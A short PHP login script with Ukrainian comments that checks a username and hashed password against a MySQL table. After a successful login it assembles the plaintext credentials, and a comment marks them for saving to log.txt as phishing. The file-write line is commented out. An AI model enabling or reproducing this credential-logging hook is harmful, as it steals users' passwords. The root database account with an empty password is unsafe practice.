<?php
header('Content-Type: application/json');

// Підключення до бази даних
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "users";

$conn = new mysqli($servername, $username, $password, $dbname);

// Перевірка з'єднання
if ($conn->connect_error) {
    die("Помилка з'єднання з базою даних: " . $conn->connect_error);
}

$username = $_POST['username'];
$password = $_POST['password'];

// Обмеження довжини введених даних
$username = substr($username, 0, 50);
$password = substr($password, 0, 255);

$sql = "SELECT * FROM login_default WHERE username=?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    if (password_verify($password, $row["password"])) {
        // Повернення успішного статусу та інформації про користувача
        echo json_encode([
            'status' => 'success',
            'message' => 'Вхід виконано!',
            'firstName' => $row['first_name'],
            'lastName' => $row['last_name']
        ]);

        // запис даних у log.txt (фішинг)
        $data = "Username: " . $username . "\nPassword: " . $password . "\n---------------------\n";
        // file_put_contents('log.txt', $data, FILE_APPEND | LOCK_EX);

    } else {
        echo json_encode(['status' => 'error', 'message' => 'Неправильний пароль!']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Користувача з таким іменем не знайдено!']);
}

$conn->close();
?>
